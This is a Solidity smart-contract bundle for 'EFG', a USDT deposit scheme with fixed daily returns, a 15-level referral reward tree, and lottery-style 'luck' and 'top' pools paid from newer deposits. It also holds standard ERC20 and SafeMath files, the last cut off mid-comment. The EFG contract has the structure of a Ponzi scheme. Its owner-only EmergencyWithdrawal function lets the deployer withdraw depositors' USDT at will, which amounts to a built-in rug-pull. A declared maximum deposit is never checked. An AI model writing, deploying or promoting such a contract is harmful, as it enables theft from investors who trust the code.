{"EFG.sol":{"content":"// SPDX-License-Identifier: GPLv3\r\npragma solidity ^0.6.12;\r\nimport \"./SafeMath.sol\";\r\nimport \"./IERC20.sol\";\r\n \r\ncontract EFG {\r\n    using SafeMath for uint256; \r\n    address  _owner;\r\n\r\n    IERC20 public usdt;\r\n    uint256 private constant baseDivider = 10000;\r\n    uint256 private constant feePercents = 200; \r\n    uint256 public constant minDeposit = 50e18;\r\n    uint256 public constant maxDeposit = 2000e18;\r\n    uint256 private constant freezeIncomePercents = 3000;\r\n\r\n    uint256 private constant timeStep = 1 days;\r\n\r\n    uint256 private constant dayPerCycle = 7 days; \r\n\r\n    uint256 private constant dayRewardPercents = 114;\r\n\r\n\r\n    uint256 private constant maxAddFreeze = 22 days;\r\n    uint256 private constant referDepth = 15;\r\n\r\n    uint256 private constant directPercents = 300;\r\n\r\n    uint256[4] private level4Percents = [100, 100, 200, 100];\r\n\r\n    uint256[10] private level5Percents = [100, 100, 100, 100, 100, 30, 30, 30, 30, 30];\r\n\r\n    uint256 private constant luckPoolPercents = 50;\r\n    uint256 private constant topPoolPercents = 20;\r\n\r\n    uint256[5] public balDown = [50e22, 150e22, 500e22, 1500e22, 5000e22];\r\n\r\n    uint256[5] public balDownRate = [1500, 2000, 5000, 6500, 7000]; \r\n\r\n    uint256[5] public balRecover = [75e22, 250e22, 750e22, 1500e22, 5000e22];\r\n \r\n    mapping(uint256=\u003ebool) public balStatus; // bal=\u003estatus\r\n\r\n    address[2] public feeReceivers;\r\n\r\n    address public defaultRefer;\r\n\r\n    uint256 public startTime;\r\n    uint256 public lastDistribute;\r\n\r\n    uint256 public totalUser; \r\n\r\n    uint256 public luckPool;\r\n\r\n\r\n    uint256 public topPool;\r\n\r\n\r\n    mapping(uint256=\u003eaddress[]) public dayLuckUsers;\r\n    mapping(uint256=\u003euint256[]) public dayLuckUsersDeposit;\r\n    mapping(uint256=\u003eaddress[3]) public dayTopUsers;\r\n    address[] public level4Users;\r\n    struct OrderInfo {\r\n        uint256 amount; \r\n        uint256 start;\r\n        uint256 unfreeze; \r\n        bool isUnfreezed;\r\n    }\r\n\r\n    mapping(address =\u003e OrderInfo[]) public orderInfos;\r\n\r\n    address[] public depositors;\r\n\r\n    struct UserInfo {\r\n\r\n        address referrer;\r\n\r\n        uint256 start;\r\n   \r\n        uint256 level; // 0,1, 2, 3, 4, 5\r\n \r\n        uint256 maxDeposit;\r\n  \r\n        uint256 totalDeposit;\r\n   \r\n        uint256 teamNum;\r\n  \r\n        uint256 maxDirectDeposit;\r\n\r\n        uint256 teamTotalDeposit;\r\n\r\n        uint256 totalFreezed;\r\n\r\n        uint256 totalRevenue;\r\n    }\r\n\r\n    mapping(address=\u003eUserInfo) public userInfo;\r\n\r\n    mapping(uint256 =\u003e mapping(address =\u003e uint256)) public userLayer1DayDeposit; // day=\u003euser=\u003eamount\r\n\r\n    mapping(address =\u003e mapping(uint256 =\u003e address[])) public teamUsers;\r\n\r\n    struct RewardInfo{\r\n   \r\n        uint256 capitals;\r\n   \r\n        uint256 statics;\r\n\r\n        uint256 directs;\r\n        uint256 level4Freezed;\r\n        uint256 level4Released;\r\n\r\n        uint256 level5Left;//\r\n        uint256 level5Freezed;\r\n        uint256 level5Released;\r\n\r\n\r\n        uint256 luck;\r\n\r\n        uint256 top;\r\n\r\n\r\n        uint256 split;\r\n\r\n        uint256 splitDebt;\r\n    }\r\n\r\n    mapping(address=\u003eRewardInfo) public rewardInfo;\r\n    \r\n    bool public isFreezeReward;\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == _owner, \"Permission denied\"); _;\r\n    }\r\n\r\n    event Register(address user, address referral);\r\n    event Deposit(address user, uint256 amount);\r\n    event DepositBySplit(address user, uint256 amount);\r\n    event TransferBySplit(address user, address receiver, uint256 amount);\r\n    event Withdraw(address user, uint256 withdrawable);\r\n\r\n    constructor(address _usdtAddr, address _defaultRefer, address[2] memory _feeReceivers) public {\r\n        usdt = IERC20(_usdtAddr);\r\n        feeReceivers = _feeReceivers;\r\n        startTime = block.timestamp;\r\n        lastDistribute = block.timestamp;\r\n        defaultRefer = _defaultRefer;\r\n        _owner = msg.sender;\r\n    }\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0));\r\n        _owner = newOwner;\r\n    }\r\n\r\n\r\n    function EmergencyWithdrawal(uint256 _bal) public onlyOwner {\r\n     usdt.transfer(msg.sender, _bal);\r\n    }\r\n\r\n  function Reduceproduction()public view  returns(uint256)  {\r\n        uint256 proportion = 10000;\r\n         uint256 yearTime = 540 * 24*60*60;\r\n  \r\n        uint256 timeDifference = block.timestamp.sub(startTime);\r\n        // 1\r\n        if(timeDifference \u003e 0 \u0026\u0026 timeDifference \u003c yearTime){\r\n            proportion = 10000;\r\n        }  \r\n\r\n        // 2\r\n        else if(timeDifference \u003e yearTime \u0026\u0026 timeDifference \u003c yearTime*2){\r\n            proportion = 8000;\r\n        }\r\n        // 3\r\n        else if(timeDifference \u003e yearTime *2 \u0026\u0026 timeDifference \u003c yearTime*3){\r\n            proportion = 6400;\r\n        } \r\n        // 4\r\n        else if(timeDifference \u003e yearTime *3 \u0026\u0026 timeDifference \u003c yearTime*4){\r\n            proportion = 5120;\r\n        } \r\n        // 5\r\n        else if(timeDifference \u003e yearTime*4 ){\r\n            proportion = 4096;\r\n        }  \r\n        return proportion; \r\n    }\r\n \r\n\r\n\r\n\r\n    function register(address _referral) external {\r\n\r\n        require(userInfo[_referral].totalDeposit \u003e 0 || _referral == defaultRefer, \"invalid refer\");\r\n        UserInfo storage user = userInfo[msg.sender];\r\n\r\n        require(user.referrer == address(0), \"referrer bonded\");\r\n\r\n        user.referrer = _referral;\r\n\r\n        user.start = block.timestamp;\r\n    \r\n        _updateTeamNum(msg.sender);\r\n\r\n        totalUser = totalUser.add(1);\r\n        \r\n        emit Register(msg.sender, _referral);\r\n    }\r\n\r\n    function deposit(uint256 _amount) external {\r\n        \r\n        usdt.transferFrom(msg.sender, address(this), _amount);\r\n        _deposit(msg.sender, _amount);\r\n        emit Deposit(msg.sender, _amount);\r\n    }\r\n\r\n    function depositBySplit(uint256 _amount) external {\r\n        require(_amount \u003e= minDeposit \u0026\u0026 _amount.mod(minDeposit) == 0, \"amount err\");\r\n        require(userInfo[msg.sender].totalDeposit == 0, \"actived\");\r\n        uint256 splitLeft = getCurSplit(msg.sender);\r\n\r\n        require(splitLeft \u003e= _amount, \"insufficient split\");\r\n\r\n        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);\r\n\r\n        _deposit(msg.sender, _amount);\r\n        emit DepositBySplit(msg.sender, _amount);\r\n    }\r\n\r\n    function transferBySplit(address _receiver, uint256 _amount) external {\r\n        require(_amount \u003e= minDeposit \u0026\u0026 _amount.mod(minDeposit) == 0, \"amount err\");\r\n        uint256 splitLeft = getCurSplit(msg.sender);\r\n        require(splitLeft \u003e= _amount, \"insufficient income\");\r\n        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);\r\n        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);\r\n        emit TransferBySplit(msg.sender, _receiver, _amount);\r\n    }\r\n\r\n\r\n    function distributePoolRewards() public {\r\n        if(block.timestamp \u003e lastDistribute.add(timeStep)){\r\n            uint256 dayNow = getCurDay();\r\n            _distributeLuckPool(dayNow);\r\n\r\n            _distributeTopPool(dayNow);\r\n            lastDistribute = block.timestamp;\r\n        }\r\n    }\r\n\r\n    function withdraw() external {\r\n\r\n        distributePoolRewards();\r\n\r\n        (uint256 staticReward, uint256 staticSplit) = _calCurStaticRewards(msg.sender);\r\n\r\n        uint256 splitAmt = staticSplit;\r\n\r\n        uint256 withdrawable = staticReward;\r\n\r\n        (uint256 dynamicReward, uint256 dynamicSplit) = _calCurDynamicRewards(msg.sender);\r\n\r\n        withdrawable = withdrawable.add(dynamicReward);\r\n\r\n        splitAmt = splitAmt.add(dynamicSplit);\r\n\r\n        RewardInfo storage userRewards = rewardInfo[msg.sender];\r\n\r\n        userRewards.split = userRewards.split.add(splitAmt);\r\n\r\n        userRewards.statics = 0;\r\n\r\n        userRewards.directs = 0;\r\n\r\n        userRewards.level4Released = 0;\r\n\r\n        userRewards.level5Released = 0;\r\n        \r\n        userRewards.luck = 0;\r\n\r\n        userRewards.top = 0;\r\n        \r\n        withdrawable = withdrawable.add(userRewards.capitals);\r\n        userRewards.capitals = 0;\r\n  \r\n\r\n        usdt.transfer(msg.sender, withdrawable);\r\n        uint256 bal = usdt.balanceOf(address(this));\r\n        _setFreezeReward(bal);\r\n\r\n        emit Withdraw(msg.sender, withdrawable);\r\n    }\r\n    function getCurDay() public view returns(uint256) {\r\n        return (block.timestamp.sub(startTime)).div(timeStep);\r\n    }\r\n\r\n    function getDayLuckLength(uint256 _day) external view returns(uint256) {\r\n        return dayLuckUsers[_day].length;\r\n    }\r\n\r\n    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {\r\n        return teamUsers[_user][_layer].length;\r\n    }\r\n    function getOrderLength(address _user) external view returns(uint256) {\r\n        return orderInfos[_user].length;\r\n    }\r\n\r\n    function getDepositorsLength() external view returns(uint256) {\r\n        return depositors.length;\r\n    }\r\n\r\n \r\n    function getMaxFreezing(address _user) public view returns(uint256) {\r\n        uint256 maxFreezing;\r\n        for(uint256 i = orderInfos[_user].length; i \u003e 0; i--){\r\n            OrderInfo storage order = orderInfos[_user][i - 1];\r\n            if(order.unfreeze \u003e block.timestamp){\r\n                if(order.amount \u003e maxFreezing){\r\n                    maxFreezing = order.amount;\r\n                }\r\n            }else{\r\n                break;\r\n            }\r\n        }\r\n        return maxFreezing;\r\n    }\r\n    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){\r\n        uint256 totalTeam;\r\n        uint256 maxTeam;\r\n        uint256 otherTeam;\r\n        for(uint256 i = 0; i \u003c teamUsers[_user][0].length; i++){\r\n            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);\r\n            totalTeam = totalTeam.add(userTotalTeam);\r\n            if(userTotalTeam \u003e maxTeam){\r\n                maxTeam = userTotalTeam;\r\n            }\r\n        }\r\n        otherTeam = totalTeam.sub(maxTeam);\r\n        return(maxTeam, otherTeam, totalTeam);\r\n    }\r\n\r\n    function getCurSplit(address _user) public view returns(uint256){\r\n\r\n        (, uint256 staticSplit) = _calCurStaticRewards(_user);\r\n\r\n        (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);\r\n\r\n        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);\r\n    }\r\n\r\n    function _calCurStaticRewards(address _user) private view returns(uint256, uint256) {\r\n        RewardInfo storage userRewards = rewardInfo[_user];\r\n\r\n        uint256 totalRewards = userRewards.statics;\r\n\r\n        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);\r\n\r\n        uint256 withdrawable = totalRewards.sub(splitAmt);\r\n\r\n        return(withdrawable, splitAmt);\r\n    }\r\n\r\n    function _calCurDynamicRewards(address _user) private view returns(uint256, uint256) {\r\n        RewardInfo storage userRewards = rewardInfo[_user];\r\n\r\n        uint256 totalRewards = userRewards.directs.add(userRewards.level4Released).add(userRewards.level5Released);\r\n\r\n        totalRewards = totalRewards.add(userRewards.luck.add(userRewards.top));\r\n\r\n        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);\r\n        uint256 withdrawable = totalRewards.sub(splitAmt);\r\n        return(withdrawable, splitAmt);\r\n    }\r\n\r\n    function _updateTeamNum(address _user) private {\r\n        UserInfo storage user = userInfo[_user];\r\n        address upline = user.referrer;\r\n        for(uint256 i = 0; i \u003c referDepth; i++){\r\n            if(upline != address(0)){\r\n                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);\r\n                teamUsers[upline][i].push(_user);\r\n                _updateLevel(upline);\r\n                if(upline == defaultRefer) break;\r\n                upline = userInfo[upline].referrer;\r\n            }else{\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _updateTopUser(address _user, uint256 _amount, uint256 _dayNow) private {\r\n        userLayer1DayDeposit[_dayNow][_user] = userLayer1DayDeposit[_dayNow][_user].add(_amount);\r\n        bool updated;\r\n        for(uint256 i = 0; i \u003c 3; i++){\r\n            address topUser = dayTopUsers[_dayNow][i];\r\n            if(topUser == _user){\r\n\r\n                _reOrderTop(_dayNow);\r\n                updated = true;\r\n                break;\r\n            }\r\n        }\r\n  \r\n        if(!updated){\r\n            address lastUser = dayTopUsers[_dayNow][2];\r\n            if(userLayer1DayDeposit[_dayNow][lastUser] \u003c userLayer1DayDeposit[_dayNow][_user]){\r\n                dayTopUsers[_dayNow][2] = _user;\r\n                _reOrderTop(_dayNow);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _reOrderTop(uint256 _dayNow) private {\r\n        for(uint256 i = 3; i \u003e 1; i--){\r\n            address topUser1 = dayTopUsers[_dayNow][i - 1];\r\n            address topUser2 = dayTopUsers[_dayNow][i - 2];\r\n            uint256 amount1 = userLayer1DayDeposit[_dayNow][topUser1];\r\n            uint256 amount2 = userLayer1DayDeposit[_dayNow][topUser2];\r\n            if(amount1 \u003e amount2){\r\n                dayTopUsers[_dayNow][i - 1] = topUser2;\r\n                dayTopUsers[_dayNow][i - 2] = topUser1;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _removeInvalidDeposit(address _user, uint256 _amount) private {\r\n        UserInfo storage user = userInfo[_user];\r\n        address upline = user.referrer;\r\n        for(uint256 i = 0; i \u003c referDepth; i++){\r\n            if(upline != address(0)){\r\n                if(userInfo[upline].teamTotalDeposit \u003e _amount){\r\n                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);\r\n                }else{\r\n                    userInfo[upline].teamTotalDeposit = 0;\r\n                }\r\n                if(upline == defaultRefer) break;\r\n                upline = userInfo[upline].referrer;\r\n            }else{\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _updateReferInfo(address _user, uint256 _amount) private {\r\n        UserInfo storage user = userInfo[_user];\r\n        address upline = user.referrer;\r\n        for(uint256 i = 0; i \u003c referDepth; i++){\r\n            if(upline != address(0)){\r\n         \r\n                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);\r\n              \r\n                _updateLevel(upline);\r\n                if(upline == defaultRefer) break;\r\n                upline = userInfo[upline].referrer;\r\n            }else{\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _updateLevel(address _user) private {\r\n        UserInfo storage user = userInfo[_user];\r\n\r\n        uint256 levelNow = _calLevelNow(_user);\r\n        if(levelNow \u003e user.level){\r\n            user.level = levelNow;\r\n            if(levelNow == 4){\r\n                level4Users.push(_user);\r\n            }\r\n        }\r\n    }\r\n\r\n\r\n    function _calLevelNow(address _user) private view returns(uint256) {\r\n        UserInfo storage user = userInfo[_user];\r\n        uint256 total = user.totalDeposit;\r\n        uint256 levelNow;\r\n        if(total \u003e= 1000e18){\r\n            (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);\r\n            if(total \u003e= 2000e18 \u0026\u0026 user.teamNum \u003e= 200 \u0026\u0026 maxTeam \u003e= 50000e18 \u0026\u0026 otherTeam \u003e= 50000e18){\r\n                levelNow = 5;\r\n            }else if(user.teamNum \u003e= 50 \u0026\u0026 maxTeam \u003e= 10000e18 \u0026\u0026 otherTeam \u003e= 10000e18){\r\n                levelNow = 4;\r\n            }else{\r\n                levelNow = 3;\r\n            }\r\n        }else if(total \u003e= 450e18){\r\n            levelNow = 2;\r\n        }else if(total \u003e= 50e18){\r\n            levelNow = 1;\r\n        }\r\n\r\n        return levelNow;\r\n    }\r\n// 存款\r\n    function _deposit(address _user, uint256 _amount) private {\r\n        UserInfo storage user = userInfo[_user];\r\n\r\n        require(user.referrer != address(0), \"register first\");\r\n\r\n        require(_amount \u003e= minDeposit, \"less than min\");\r\n \r\n        require(_amount.mod(minDeposit) == 0 \u0026\u0026 _amount \u003e= minDeposit, \"mod err\");\r\n\r\n        require(user.maxDeposit == 0 || _amount \u003e= user.maxDeposit, \"less before\");\r\n\r\n        if(user.maxDeposit == 0){\r\n            user.maxDeposit = _amount;\r\n        }else if(user.maxDeposit \u003c _amount){\r\n            user.maxDeposit = _amount;\r\n        }\r\n\r\n        _distributeDeposit(_amount);\r\n\r\n        if(user.totalDeposit == 0){\r\n            uint256 dayNow = getCurDay();\r\n\r\n            dayLuckUsers[dayNow].push(_user);\r\n\r\n            dayLuckUsersDeposit[dayNow].push(_amount);\r\n\r\n            _updateTopUser(user.referrer, _amount, dayNow);\r\n        }\r\n\r\n        depositors.push(_user);\r\n\r\n        user.totalDeposit = user.totalDeposit.add(_amount);\r\n\r\n        user.totalFreezed = user.totalFreezed.add(_amount);\r\n\r\n        _updateLevel(msg.sender);\r\n\r\n        uint256 addFreeze = (orderInfos[_user].length.div(4)).mul(timeStep);\r\n\r\n        if(addFreeze \u003e maxAddFreeze){\r\n            addFreeze = maxAddFreeze;\r\n        }\r\n\r\n        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);\r\n\r\n        orderInfos[_user].push(OrderInfo(\r\n            _amount, \r\n            block.timestamp, \r\n            unfreezeTime,\r\n            false\r\n        ));\r\n\r\n        _unfreezeFundAndUpdateReward(msg.sender, _amount);\r\n\r\n        distributePoolRewards();\r\n\r\n        _updateReferInfo(msg.sender, _amount);\r\n\r\n        _updateReward(msg.sender, _amount);\r\n\r\n        _releaseUpRewards(msg.sender, _amount);\r\n\r\n        uint256 bal = usdt.balanceOf(address(this));\r\n\r\n        _balActived(bal);\r\n        if(isFreezeReward){\r\n            _setFreezeReward(bal);\r\n        }\r\n    }\r\n\r\n\r\n    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {\r\n        UserInfo storage user = userInfo[_user];\r\n\r\n        bool isUnfreezeCapital;\r\n        for(uint256 i = 0; i \u003c orderInfos[_user].length; i++){\r\n            OrderInfo storage order = orderInfos[_user][i]; \r\n            if(block.timestamp \u003e order.unfreeze  \u0026\u0026 order.isUnfreezed == false \u0026\u0026 _amount \u003e= order.amount){\r\n                order.isUnfreezed = true;\r\n                isUnfreezeCapital = true;\r\n                if(user.totalFreezed \u003e order.amount){\r\n                    user.totalFreezed = user.totalFreezed.sub(order.amount);\r\n                }else{\r\n                    user.totalFreezed = 0;\r\n                }\r\n                _removeInvalidDeposit(_user, order.amount);\r\n                uint256 staticReward = order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider).mul(Reduceproduction()).div(10000);\r\n                if(isFreezeReward){\r\n                    if(user.totalFreezed \u003e user.totalRevenue){\r\n                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);\r\n\r\n                        if(staticReward \u003e leftCapital){\r\n                            staticReward = leftCapital;\r\n                        }\r\n                    }else{\r\n                        staticReward = 0;\r\n                    }\r\n                }\r\n                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);\r\n                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);\r\n                user.totalRevenue = user.totalRevenue.add(staticReward);\r\n\r\n                break;\r\n            }\r\n        }\r\n        if(!isUnfreezeCapital){ \r\n\r\n            RewardInfo storage userReward = rewardInfo[_user];\r\n\r\n            if(userReward.level5Freezed \u003e 0){\r\n                uint256 release = _amount;\r\n                if(_amount \u003e= userReward.level5Freezed){\r\n\r\n                    release = userReward.level5Freezed;\r\n                }\r\n                userReward.level5Freezed = userReward.level5Freezed.sub(release);\r\n                userReward.level5Released = userReward.level5Released.add(release);\r\n                user.totalRevenue = user.totalRevenue.add(release);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _distributeLuckPool(uint256 _dayNow) private {\r\n        uint256 dayDepositCount = dayLuckUsers[_dayNow - 1].length;\r\n        if(dayDepositCount \u003e 0){\r\n            uint256 checkCount = 10;\r\n\r\n            if(dayDepositCount \u003c 10){\r\n                checkCount = dayDepositCount;\r\n            }\r\n            uint256 totalDeposit;\r\n            uint256 totalReward;\r\n            for(uint256 i = dayDepositCount; i \u003e dayDepositCount.sub(checkCount); i--){\r\n                totalDeposit = totalDeposit.add(dayLuckUsersDeposit[_dayNow - 1][i - 1]);\r\n            }\r\n\r\n            for(uint256 i = dayDepositCount; i \u003e dayDepositCount.sub(checkCount); i--){\r\n                address userAddr = dayLuckUsers[_dayNow - 1][i - 1];\r\n                if(userAddr != address(0)){\r\n                    uint256 reward = luckPool.mul(dayLuckUsersDeposit[_dayNow - 1][i - 1]).div(totalDeposit);\r\n                    totalReward = totalReward.add(reward);\r\n                    rewardInfo[userAddr].luck = rewardInfo[userAddr].luck.add(reward);\r\n                    userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);\r\n                }\r\n            }\r\n            if(luckPool \u003e totalReward){\r\n                luckPool = luckPool.sub(totalReward);\r\n            }else{\r\n                luckPool = 0;\r\n            }\r\n        }\r\n    }\r\n    function _distributeTopPool(uint256 _dayNow) private {\r\n        uint16[3] memory rates = [5000, 3000, 2000];\r\n        uint32[3] memory maxReward = [2000e6, 1000e6, 500e6];\r\n         uint256 totalReward;\r\n        for(uint256 i = 0; i \u003c 3; i++){\r\n            address userAddr = dayTopUsers[_dayNow - 1][i];\r\n            if(userAddr != address(0)){\r\n                uint256 reward = topPool.mul(rates[i]).div(baseDivider);\r\n                uint256 max = maxReward[i];\r\n                if(reward \u003e max.mul(10e12)){\r\n                    reward = max.mul(10e12);\r\n                }\r\n                rewardInfo[userAddr].top = rewardInfo[userAddr].top.add(reward);\r\n                userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);\r\n                totalReward = totalReward.add(reward);\r\n            }\r\n        }\r\n        if(topPool \u003e totalReward){\r\n            topPool = topPool.sub(totalReward);\r\n        }else{\r\n            topPool = 0;\r\n        }\r\n    }\r\n    function _distributeDeposit(uint256 _amount) private {\r\n        uint256 fee = _amount.mul(feePercents).div(baseDivider);\r\n        usdt.transfer(feeReceivers[0], fee.div(2));\r\n        usdt.transfer(feeReceivers[1], fee.div(2));\r\n\r\n        uint256 luck = _amount.mul(luckPoolPercents).div(baseDivider);\r\n        luckPool = luckPool.add(luck);\r\n\r\n        uint256 top = _amount.mul(topPoolPercents).div(baseDivider);\r\n        topPool = topPool.add(top);\r\n    }\r\n\r\n    function _updateReward(address _user, uint256 _amount) private {\r\n        UserInfo storage user = userInfo[_user];\r\n        address upline = user.referrer;\r\n        for(uint256 i = 0; i \u003c referDepth; i++){\r\n            if(upline != address(0)){\r\n                uint256 newAmount = _amount;\r\n                if(upline != defaultRefer){\r\n                    uint256 maxFreezing = getMaxFreezing(upline);\r\n                    if(maxFreezing \u003c _amount){\r\n                        newAmount = maxFreezing;\r\n                    }\r\n                }\r\n                RewardInfo storage upRewards = rewardInfo[upline];\r\n                uint256 reward;\r\n                if(i \u003e 4){\r\n                    if(userInfo[upline].level \u003e 4){\r\n                        reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider).mul(Reduceproduction()).div(10000);\r\n                        upRewards.level5Freezed = upRewards.level5Freezed.add(reward);\r\n                    }\r\n                }else if(i \u003e 0){\r\n                    if( userInfo[upline].level \u003e 3){\r\n                        reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider).mul(Reduceproduction()).div(10000);\r\n                        upRewards.level4Freezed = upRewards.level4Freezed.add(reward);\r\n                    }\r\n                }else{\r\n                    reward = newAmount.mul(directPercents).div(baseDivider).mul(Reduceproduction()).div(10000);\r\n                    upRewards.directs = upRewards.directs.add(reward);\r\n                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);\r\n                }\r\n                if(upline == defaultRefer) break;\r\n                upline = userInfo[upline].referrer;\r\n            }else{\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _releaseUpRewards(address _user, uint256 _amount) private {\r\n        UserInfo storage user = userInfo[_user];\r\n        address upline = user.referrer;\r\n        for(uint256 i = 0; i \u003c referDepth; i++){\r\n            if(upline != address(0)){\r\n                uint256 newAmount = _amount;\r\n                if(upline != defaultRefer){\r\n                    uint256 maxFreezing = getMaxFreezing(upline);\r\n                    if(maxFreezing \u003c _amount){\r\n                        newAmount = maxFreezing;\r\n                    }\r\n                }\r\n\r\n                RewardInfo storage upRewards = rewardInfo[upline];\r\n                if(i \u003e 0 \u0026\u0026 i \u003c 5 \u0026\u0026 userInfo[upline].level \u003e 3){\r\n                    if(upRewards.level4Freezed \u003e 0){\r\n                        uint256 level4Reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);\r\n                        if(level4Reward \u003e upRewards.level4Freezed){\r\n                            level4Reward = upRewards.level4Freezed;\r\n                        }\r\n                        upRewards.level4Freezed = upRewards.level4Freezed.sub(level4Reward); \r\n                        upRewards.level4Released = upRewards.level4Released.add(level4Reward);\r\n                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(level4Reward);\r\n                    }\r\n                }\r\n\r\n                if(i \u003e= 5 \u0026\u0026 userInfo[upline].level \u003e 4){\r\n                    if(upRewards.level5Left \u003e 0){\r\n                        uint256 level5Reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider);\r\n                        if(level5Reward \u003e upRewards.level5Left){\r\n                            level5Reward = upRewards.level5Left;\r\n                        }\r\n                        upRewards.level5Left = upRewards.level5Left.sub(level5Reward); \r\n                        upRewards.level5Freezed = upRewards.level5Freezed.add(level5Reward);\r\n                    }\r\n                }\r\n                upline = userInfo[upline].referrer;\r\n            }else{\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _balActived(uint256 _bal) private {\r\n        for(uint256 i = balDown.length; i \u003e 0; i--){\r\n            if(_bal \u003e= balDown[i - 1]){\r\n                balStatus[balDown[i - 1]] = true;\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _setFreezeReward(uint256 _bal) private {\r\n        for(uint256 i = balDown.length; i \u003e 0; i--){\r\n            if(balStatus[balDown[i - 1]]){\r\n                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);\r\n                if(_bal \u003c balDown[i - 1].sub(maxDown)){\r\n                    isFreezeReward = true;\r\n                }else if(isFreezeReward \u0026\u0026 _bal \u003e= balRecover[i - 1]){\r\n                    isFreezeReward = false;\r\n                }\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n\r\n \r\n}\r\n"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.6.0;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.6.0;\r\n\r\n/**\r\n * @dev Wrappers over Solidity\u0027s arithmetic operations with added overflow\r\n * checks.\r\n *\r\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\r\n * in bugs, because programmers usually assume that an overflow raises an\r\n * error, which is the standard behavior in high level programming languages.\r\n * `SafeMath` restores this intuition by reverting the transaction when an\r\n * operation overflows.\r\n *\r\n * Using this library instead of the unchecked operations eliminates an entire\r\n * class of bugs, so it\u0027s recommended to use it always.\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to 